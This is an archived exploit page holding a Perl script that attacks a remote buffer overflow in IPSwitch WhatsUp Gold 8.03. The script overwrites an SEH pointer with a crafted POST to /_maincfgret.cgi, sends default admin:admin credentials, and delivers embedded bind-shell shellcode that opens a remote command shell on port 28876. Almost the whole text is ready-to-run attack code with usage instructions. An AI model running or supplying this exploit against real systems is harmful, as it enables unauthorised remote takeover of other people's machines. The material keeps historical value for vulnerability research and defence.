<html><head><title>IPSwitch WhatsUp Gold 8.03 Remote Buffer Overflow Exploit</title></head><pre>#!/usr/bin/perl 
# [LoWNOISE] NotmuchG.pl v.1.5
# ================================================
# IPSWITCH WhatsUp Gold ver8.03 Remote Buffer Overflow Exploit
# ================================================
#
# Exploit by ET LoWNOISE Colombia 
# et(at)cyberspace.org
# Oct/2004
# 
# Tested on WIN2K SP4 
#
# The exploit takes control by overwriting the pointer of a Structured
Exception Handler, 
# installed by WhatsUP and points to a routine that handles exceptions.
# (http://www.thc.org/papers/Practical-SEH-exploitation.pdf Johnny
Cyberpunk THC)
#
# The overflow string has to be around 4080 in length to generate an
exception that can
# be manipulated by changing the SEH pointer (ret [815]).
# 
#
# Bug Discovered by 
# iDEFENSE Security Advisory 08.25.04
# http://www.idefense.com/application/poi/display?type=vulnerabilities
#
# Greetz to the midget, the m3 and los parces , the seltiks, p0ch1n,
Ritt3r,Mav, f4lc0n.. 

use strict; 
use IO::Socket::INET;

usage() unless (@ARGV == 2); 

my $host = shift(@ARGV); 
my $port = shift(@ARGV); 

# Bind shellcode port 28876 (HDM, metasploit.org)
my $shellcode =
&quot;\xeb\x43\x56\x57\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea\x52\x8b\x52&quot;. 
&quot;\x20\x01\xea\x31\xc0\x31\xc9\x41\x8b\x34\x8a\x01\xee\x31\xff\xc1&quot;. 
&quot;\xcf\x13\xac\x01\xc7\x85\xc0\x75\xf6\x39\xdf\x75\xea\x5a\x8b\x5a&quot;. 
&quot;\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01&quot;. 
&quot;\xe8\x5f\x5e\xff\xe0\xfc\x31\xc0\x64\x8b\x40\x30\x8b\x40\x0c\x8b&quot;. 
&quot;\x70\x1c\xad\x8b\x68\x08\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x33\x32&quot;. 
&quot;\x2e\x64\x68\x77\x73\x32\x5f\x54\xbb\x71\xa7\xe8\xfe\xe8\x90\xff&quot;. 
&quot;\xff\xff\x89\xef\x89\xc5\x81\xc4\x70\xfe\xff\xff\x54\x31\xc0\xfe&quot;. 
&quot;\xc4\x40\x50\xbb\x22\x7d\xab\x7d\xe8\x75\xff\xff\xff\x31\xc0\x50&quot;. 
&quot;\x50\x50\x50\x40\x50\x40\x50\xbb\xa6\x55\x34\x79\xe8\x61\xff\xff&quot;. 
&quot;\xff\x89\xc6\x31\xc0\x50\x50\x35\x02\x01\x70\xcc\xfe\xcc\x50\x89&quot;. 
&quot;\xe0\x50\x6a\x10\x50\x56\xbb\x81\xb4\x2c\xbe\xe8\x42\xff\xff\xff&quot;. 
&quot;\x31\xc0\x50\x56\xbb\xd3\xfa\x58\x9b\xe8\x34\xff\xff\xff\x58\x6a&quot;. 
&quot;\x10\x54\x50\x56\xbb\x47\xf3\x56\xc6\xe8\x24\xff\xff\xff\x31\xdb&quot;. 
&quot;\x53\x68\x2e\x63\x6d\x64\x89\xe1\x41\x50\x50\x50\x53\x53\x31\xc0&quot;. 
&quot;\xfe\xc4\x40\x50\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x6a\x44&quot;. 
&quot;\x89\xe6\x50\x55\x53\x53\x53\x53\x54\x56\x53\x53\x53\x43\x53\x4b&quot;. 
&quot;\x53\x53\x51\x53\x89\xfd\xbb\x21\xd0\x05\xd0\xe8\xe2\xfe\xff\xff&quot;. 
&quot;\x31\xc0\x48\x8b\x44\x24\x04\xbb\x43\xcb\x8d\x5f\xe8\xd1\xfe\xff&quot;. 
&quot;\xff\x5d\x5d\x5d\xbb\x12\x6b\x6d\xd0\xe8\xc4\xfe\xff\xff\x31\xc0&quot;. 
&quot;\x50\x89\xfd\xbb\x69\x1d\x42\x3a\xe8\xb5\xfe\xff\xff&quot;; 

my $socket = IO::Socket::INET-&gt;new(proto=&gt;'tcp', PeerAddr=&gt;$host,
PeerPort=&gt;$port); 
$socket or die &quot;Cannot connect to the host.\n&quot;; 

$socket-&gt;autoflush(1); 

print $socket &quot;POST /_maincfgret.cgi HTTP/1.0\r\n&quot;; 
print $socket &quot;Accept: image/gif, image/x-xbitmap, image/jpeg,
image/pjpeg, application/vnd.ms-powerpoint, application/vnd.ms-excel,
application/msword, application/x-shockwave-flash,
application/vnd.citrix.AdvGWClient-2_2, */*\r\n&quot;; 
print $socket &quot;Referer:
http://127.0.0.1/NotifyAction.asp?action=AddType&amp;instance=Beeper&amp;end=end\r\n&quot;; 
print $socket &quot;Accept-Language: en-us\r\nContent-Type:
application/x-www-form-urlencoded\r\nConnection: Keep-Alive\r\n&quot;;
print $socket &quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT
5.1; T312461; .NET CLR 1.1.4322)\r\n&quot;;
print $socket &quot;Host: 127.0.0.1\r\nContent-Length: &quot;;
my $cmd =&quot;page=notify&amp;origname=&amp;action=return&amp;type=Beeper&amp;instancename=&quot;;


#[-------815-------------] [ret] [-------------4080---------]
#[A.....811...A][jmp] [ret] [nops][shc][E.......E ]

$cmd .= &quot;A&quot;x811; #815 -4 
$cmd .= &quot;\xeb\x06\x90\x90&quot;; #jumper &lt;eb + 06&gt; &lt;garbage&gt; jmp to shellcode


#$cmd .= &quot;\xfe\x63\xa1\x71&quot;; #winXP SP1 ws2help.dll
$cmd .= &quot;\xc4\x2a\x02\x75&quot;; #win2k sp0-sp4 ws2help.dll

#$cmd .= &quot;LOWNOISE&quot;; #garbage :D 
$cmd .= &quot;\x90&quot;x2080;
$cmd .= $shellcode;
$cmd .= &quot;E&quot;x(2000-length($shellcode)); #mas basura

$cmd .= &quot;&amp;beepernumber=&amp;upcode=0*&amp;downcode=9*&amp;trapcode=6*&amp;end=end&quot;;
print $socket length($cmd).&quot;\r\nPragma: no-cache\r\nAuthorization: Basic
YWRtaW46YWRtaW4=\r\n\r\n&quot;;
print $socket $cmd.&quot;\r\n&quot;;

close($socket); 
exit(0); 

sub usage 
{ 
print &quot;\n[LoWNOISE] IPSWITCH WhatsUp Gold 8.03 Remote fr33 exploit\n&quot;;
print &quot;===================================================\n&quot;;
print &quot;\nUsage: NotmuchG.pl [host] [port]\n&quot;; 
print &quot;[host] Target host\n[port] WhatsUp webserver port\n\n&quot;; 
print &quot;\n Shell on tcp port 28876.\n\n&quot;; 
print &quot;ET LoWNOISE 2004\n&quot;;
exit(1); 
}


# milw0rm.com [2004-10-04]</pre></html>